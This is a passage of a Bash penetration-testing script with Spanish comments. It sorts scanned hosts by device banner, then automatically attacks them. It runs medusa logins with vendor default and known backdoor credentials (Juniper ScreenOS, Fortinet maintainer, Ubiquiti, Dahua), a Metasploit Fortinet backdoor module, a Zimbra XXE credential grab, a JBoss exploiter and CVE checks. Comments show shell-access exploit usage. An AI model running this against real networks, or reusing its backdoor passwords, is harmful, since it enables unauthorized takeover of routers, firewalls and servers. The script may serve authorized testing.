			if [[ $greprc -eq 0 ]] ; then							
				grep --color=never "exists" logs/vulnerabilidades/"$ip"_"$port"_vrfyEnum.txt > .vulnerabilidades/"$ip"_"$port"_vrfyEnum.txt					
				echo -e "\t$OKRED[!] Se enumero usuarios mediante el comando VRFY \n $RESET"
			else				
				echo -e "\t$OKGREEN[i] No se encontro usuarios $RESET"
			fi
		done <.servicios/smtp.txt	
		insert_data
fi		 


##################################### banners ##########################
echo ""
echo -e "$OKBLUE ############# Obteniendo banners de los servicios ############## $RESET"
getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep


######## wait to finish########
  while true; do
	nmap_instancias=$((`ps aux | grep nmap | wc -l` - 1)) 
  if [ "$nmap_instancias" -gt 0 ]
	then
		echo -e "\t[i] Todavia hay escaneos de nmap activos ($nmap_instancias)"  
		sleep 30
	else
		break		  		 
	fi				
  done
##############################

cat .nmap_banners/*.grep > .nmap/nmap-tcp-banners.grep
cat .nmap_banners/*.txt > reportes/nmap-tcp-banners.txt
#############################################################################



cd .nmap		
	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/MikroTik2.txt
	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/MikroTik2.txt 
	sort ../.servicios/MikroTik2.txt | sort | uniq > ../.servicios/MikroTik.txt; rm ../.servicios/MikroTik2.txt
	
	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/d-link2.txt
	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ubiquiti2.txt
	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/fortinet2.txt
	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/3com2.txt
	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/linksys2.txt
	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/Netgear.txt
	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/zyxel.txt
	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ZTE2.txt
	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ZTE2.txt
	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/tp-link.txt
	grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/cisco.txt
	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ciscoASA.txt	
	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/samba.txt
	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/RomPager.txt
	grep -i "NetScreen" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/NetScreen.txt #juniper
	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/upnp.txt; sort ../.servicios/upnp.txt | uniq >../.servicios/upnp2.txt ; mv ../.servicios/upnp2.txt ../.servicios/upnp.txt
	
	### Revisar certificados SSL, Titulos web ##
	cd ..
	cd .enumeracion2/
	touch canary.txt # es necesario que exista al menos 2 archivos 
	#phpmyadmin
	grep --color=never -i admin *admin.txt 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
	
	#tomcat
	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
		
	
	#fortinet
	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | cut -d "_" -f1 >> ../.servicios/fortinet2.txt
	sort ../.servicios/fortinet2.txt | uniq > ../.servicios/fortinet.txt
	rm ../.servicios/fortinet2.txt
	
	#3com
	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | cut -d "_" -f1 >> ../.servicios/3com2.txt
	sort ../.servicios/3com2.txt | uniq > ../.servicios/3com.txt
	rm ../.servicios/3com2.txt
	
	#d-link
	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | cut -d "_" -f1 >> ../.servicios/d-link2.txt
	sort ../.servicios/d-link2.txt | uniq > ../.servicios/d-link.txt
	rm ../.servicios/d-link2.txt

	#linksys
	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | cut -d "_" -f1 >> ../.servicios/linksys2.txt
	sort ../.servicios/linksys2.txt | uniq > ../.servicios/linksys.txt
	rm ../.servicios/linksys2.txt
		
	
	#Pentahoo	
	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../.servicios/pentaho.txt
	
	#ubiquiti
	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/ubiquiti2.txt	
	sort ../.servicios/ubiquiti2.txt | uniq > ../.servicios/ubiquiti.txt ; rm ../.servicios/ubiquiti2.txt
	
	#pfsense
	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/pfsense.txt
	
	#PRTG
	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/PRTG.txt
	
	#ZKsoftware
	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"| sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../.servicios/ZKSoftware.txt		
	
	#ZTE
	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../.servicios/ZTE2.txt
	sort ../.servicios/ZTE2.txt | uniq > ../.servicios/ZTE.txt ; rm ../.servicios/ZTE2.txt
		
	
	#zimbra
	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/zimbra.txt		
	
	#jboss
	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata"  | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/jboss.txt
	
	#401
	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1  > ../.servicios/web401-2.txt
	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1  > ../.servicios/web401-2.txt
	# sort
	sort ../.servicios/web401-2.txt | uniq > ../.servicios/web401.txt
	rm ../.servicios/web401-2.txt
	
cd ..
################################

find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null

# UPNP
if [ -f .servicios/upnp.txt ]
then
	echo -e "$OKBLUE #################### UPnP (`wc -l .servicios/upnp.txt`) ######################$RESET"
	for ip in $(cat .servicios/upnp.txt); do		
		echo -e "[+] Escaneando $ip:1900"		
		upnp_info.py $ip  >> logs/vulnerabilidades/"$ip"_upnp_enum.txt 2>/dev/null &					
	done
	
	
	# revisar si hay scripts ejecutandose
	while true; do
	upnp_instancias=`ps aux | egrep 'upnp_info.py' | wc -l`		
	if [ "$upnp_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($upnp_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true		
	
	# Revisar si se detecto servicios upnp
	for ip in $(cat .servicios/upnp.txt); do			
					
		egrep -iq "http" logs/vulnerabilidades/"$ip"_upnp_enum.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Servicio upnp descubierto \n $RESET"
			cp logs/vulnerabilidades/"$ip"_upnp_enum.txt .vulnerabilidades/"$ip"_upnp_enum.txt
		fi														
	done		
	
	#insert clean data	
	insert_data	
fi


#zimbra
if [ -f .servicios/zimbra.txt ]
then
	echo -e "$OKBLUE #################### zimbra (`wc -l .servicios/zimbra.txt`) ######################$RESET"	    	
	while read line
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip : $port"					
		echo "hackWeb.pl -t $ip -p $port -m zimbraXXE" > logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 2>/dev/null		
		hackWeb.pl -t $ip -p $port -m zimbraXXE  >> logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 2>/dev/null		
		grep -i "credenciales" logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt  > .vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 															
		 echo ""
 	done <.servicios/zimbra.txt
	#insert clean data	
	insert_data	
fi


#cisco
if [ -f .servicios/ciscoASA.txt ]
then
	echo -e "$OKBLUE #################### cisco (`wc -l .servicios/ciscoASA.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip:443"		
		echo "nmap -n -Pn  -p 443 --script http-vuln-cve2014-2128 $ip" > logs/vulnerabilidades/"$ip"_cisco_vuln.txt 2>/dev/null		
		nmap -n -Pn  -p 443 --script http-vuln-cve2014-2128 $ip >> logs/vulnerabilidades/"$ip"_cisco_vuln.txt 2>/dev/null		
		grep "|" logs/vulnerabilidades/"$ip"_cisco_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_cisco_vuln.txt
		
#		nmap -n -Pn  -p 443 --script http_vuln-cve2014-2129 $ip > logs/vulnerabilidades/"$ip"_cisco-dos.txt 2>/dev/null		
		#grep "|" logs/vulnerabilidades/"$ip"_cisco-dos.txt  > .vulnerabilidades/"$ip"_cisco-dos.txt
													 
		 echo ""
 	done <.servicios/ciscoASA.txt
	#insert clean data	
	insert_data	
fi

#cisco
if [ -f .servicios/cisco.txt ]
then
	echo -e "$OKBLUE #################### cisco (`wc -l .servicios/cisco.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip"
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_admin_cisco.txt 2>/dev/null
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_admin_cisco.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_admin_cisco.txt > .vulnerabilidades/"$ip"_admin_cisco.txt 2>/dev/null
		echo ""													 		
 	done <.servicios/cisco.txt
	#insert clean data	
	insert_data	
fi


#samba
if [ -f .servicios/samba.txt ]
then
	echo -e "$OKBLUE #################### samba (`wc -l .servicios/samba.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip:445"		
		echo "nmap -n -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip" > logs/vulnerabilidades/"$ip"_samba_vuln.txt 2>/dev/null
		nmap -n -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip >> logs/vulnerabilidades/"$ip"_samba_vuln.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/"$ip"_samba_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_samba_vuln.txt
		#scanner/smb/smb_uninit_cred											 
		 echo ""
 	done <.servicios/samba.txt
	#insert clean data	
	insert_data	
fi

#RomPager
if [ -f .servicios/RomPager.txt ]
then
	echo -e "$OKBLUE #################### RomPager (`wc -l .servicios/RomPager.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip:80"	
		misfortune_cookie.pl -target $ip -port 80 > logs/vulnerabilidades/"$ip"_80_misfortune.txt 2>/dev/null 
		grep --color=never "bimqODoXWaTzdFnh" logs/vulnerabilidades/"$ip"_80_misfortune.txt > .vulnerabilidades/"$ip"_80_misfortune.txt 2>/dev/null 
													 
		 echo ""
 	done <.servicios/RomPager.txt
	#insert clean data	
	insert_data	
	
	#exploit 
	#use auxiliary/admin/http/allegro_rompager_auth_bypass
fi


# cisco backdoor

if [ -f .servicios/backdoor32764.txt ]
then
	echo -e "$OKBLUE #################### Cisco linksys WAG200G backdoor (`wc -l .servicios/backdoor32764.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip:32764"	
		backdoor32764.py --ip $ip > logs/vulnerabilidades/"$ip"_32764_ciscoBackdoor.txt 2>/dev/null
		grep "is vulnerable" logs/vulnerabilidades/"$ip"_32764_ciscoBackdoor.txt  > .vulnerabilidades/"$ip"_32764_ciscoBackdoor.txt
		# exploit		
		# backdoor32764.py --ip 192.168.0.1 --shell

		 echo ""
 	done <.servicios/backdoor32764.txt
	#insert clean data	
	insert_data	
fi


# fortigate backdoor

if [ -f .servicios/fortinet.txt ]
then
	echo -e "$OKBLUE #################### fortinet (`wc -l .servicios/fortinet.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"		
		
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_admin_fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p 'bcpb+serial#' -M telnet >> logs/vulnerabilidades/"$ip"_admin_fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p admin -M telnet >> logs/vulnerabilidades/"$ip"_admin_fortinet.txt 2>/dev/null
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_admin_fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p 'bcpb+serial#' -M ssh >> logs/vulnerabilidades/"$ip"_admin_fortinet.txt 2>/dev/null
			medusa -h $ip -u maintainer -p admin -M ssh >> logs/vulnerabilidades/"$ip"_admin_fortinet.txt 2>/dev/null
			
			msfconsole -x "use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_22_fortigateBackdoor.txt 2>/dev/null		
			sleep 5
			grep --color=never -i "Logged" logs/vulnerabilidades/"$ip"_22_fortigateBackdoor.txt  > .vulnerabilidades/"$ip"_22_fortigateBackdoor.txt
		fi					
						
		 echo ""
 	done <.servicios/fortinet.txt
	#exploit 
	# cd /opt/backdoors/
	# python fortigate.py 192.168.0.1
	
	#insert clean data	
	insert_data	
fi

# Juniper 
if [ -f .servicios/NetScreen.txt ]
then
	echo -e "$OKBLUE #################### NetScreen - Juniper (`wc -l .servicios/NetScreen.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"
		
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"			
			medusa -h $ip -u admin -p abc123 -M telnet >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
			medusa -h $ip -u super -p juniper123 -M telnet >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null						
			medusa -u admin -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
			medusa -u root -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
			medusa -u netscreen -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p abc123 -M ssh >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
			medusa -h $ip -u super -p juniper123 -M ssh >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null						
			medusa -u admin -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
			medusa -u root -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
			medusa -u netscreen -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_admin_juniper.txt 2>/dev/null
		fi					
					
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_admin_juniper.txt > .vulnerabilidades/"$ip"_admin_juniper.txt 
		echo ""
 	done <.servicios/NetScreen.txt
	#exploit 
	# ssh root@192.168.0.1  pass=<<< %s(un='%s') = %u	
	#insert clean data	
	insert_data
fi

# zyxel default password
if [ -f .servicios/zyxel.txt ]
then
	echo -e "$OKBLUE #################### zyxel (`wc -l .servicios/zyxel.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p user -M telnet >> logs/vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null
			medusa -h $ip -u admin -p user -M ssh >> logs/vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_admin_zyxel.txt > .vulnerabilidades/"$ip"_admin_zyxel.txt 2>/dev/null
		echo ""
 	done <.servicios/zyxel.txt	
	insert_data
fi


# mikrotik default password
if [ -f .servicios/mikrotik.txt ]
then
	echo -e "$OKBLUE #################### mikrotik (`wc -l .servicios/mikrotik.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_admin_mikrotik.txt 2>/dev/null
			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_admin_mikrotik.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_admin_mikrotik.txt > .vulnerabilidades/"$ip"_admin_mikrotik.txt
		echo ""
 	done <.servicios/mikrotik.txt	
	insert_data
fi

# ubiquiti default password
if [ -f .servicios/ubiquiti.txt ]
then
	echo -e "$OKBLUE #################### ubiquiti (`wc -l .servicios/ubiquiti.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt 2>/dev/null
			medusa -h $ip -u root -p ubnt -M telnet >> logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt 2>/dev/null
			medusa -h $ip -u ubnt -p ubnt -M telnet >> logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt 2>/dev/null
			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt 2>/dev/null
			medusa -h $ip -u root -p ubnt -M ssh >> logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt 2>/dev/null
			medusa -h $ip -u ubnt -p ubnt -M ssh >> logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt 2>/dev/null
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_admin_ubiquiti.txt > .vulnerabilidades/"$ip"_admin_ubiquiti.txt
		echo ""
 	done <.servicios/ubiquiti.txt	
	insert_data
fi


# dahua default password
if [ -f .servicios/dahua.txt ]
then
	echo -e "$OKBLUE #################### dahua (`wc -l .servicios/dahua.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
			echo -e "\t[+] Probando password por defecto"
			echo "medusa -u root -p vizxv -h $ip -M telnet" > logs/vulnerabilidades/"$ip"_23_passworddahua_dvr.txt 2>/dev/null
			medusa -u root -p vizxv -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passworddahua_dvr.txt 2>/dev/null
			
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passworddahua_dvr.txt > .vulnerabilidades/"$ip"_23_passworddahua_dvr.txt 
			
			#echo "medusa -e n -u root -h $ip -M telnet" > logs/vulnerabilidades/"$ip"_23_passwordTelnet.txt 2>/dev/null
			#medusa -e n -u root -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordTelnet.txt 2>/dev/null
			
			#echo "medusa -e n -u admin -h $ip -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordTelnet.txt 2>/dev/null
			#medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordTelnet.txt 2>/dev/null
			
			
			#grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_password.txt 2>/dev/null > .vulnerabilidades/"$ip"_23_password.txt		
 	done <.servicios/dahua.txt	
	insert_data
fi

	
			
			
# pfsense default password
if [ -f .servicios/pfsense.txt ]
then
	echo -e "$OKBLUE #################### pfsense (`wc -l .servicios/pfsense.txt`) ######################$RESET"	    
	while read line     
	do     						
		echo -e "[+] Escaneando $line"	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p pfsense -M ssh >> logs/vulnerabilidades/"$ip"_admin_pfsense.txt 2>/dev/null			
		fi					
				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_pfsense.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt
		echo ""
 	done <.servicios/pfsense.txt	
	insert_data
fi

# JBOSS
if [ -f .servicios/jboss.txt ]
then
	echo -e "$OKBLUE #################### jboss (`wc -l .servicios/jboss.txt`) ######################$RESET"	    
	while read line
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip : $port"	
		if [[ $port == "443" || $port == "8443"  ]]
		then 
			jexboss.sh --disable-check-updates -u "https://$line" > logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt
		else
			jexboss.sh --disable-check-updates -u "http://$line"  > logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt		
		fi
						
		egrep --color=never "VULNERABLE|EXPOSED|INCONCLUSIVE" logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt > .vulnerabilidades/"$ip"_"$port"_jbossVuln.txt
		echo ""
 	done <.servicios/jboss.txt	
	insert_data
fi


# Netgear default password
if [ -f .servicios/Netgear.txt ]
then
	echo -e "$OKBLUE #################### Netgear (`wc -l .servicios/Netgear.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt
		fi					
				
		
		echo ""
 	done <.servicios/Netgear.txt	
	insert_data
fi


# linksys default password
if [ -f .servicios/linksys.txt ]
then
	echo -e "$OKBLUE #################### linksys (`wc -l .servicios/linksys.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u admin -p password -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u root -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			medusa -e n -u linksys -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt > .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			
		fi		

		egrep -iq "22/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			medusa -h $ip -u admin -p password -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			medusa -h $ip -u root -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			medusa -e n -u linksys -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt
		fi					
						
		echo ""
 	done <.servicios/linksys.txt	
	insert_data
fi



# d-link default password
if [ -f .servicios/d-link.txt ]
then
	echo -e "$OKBLUE #################### d-link (`wc -l .servicios/d-link.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
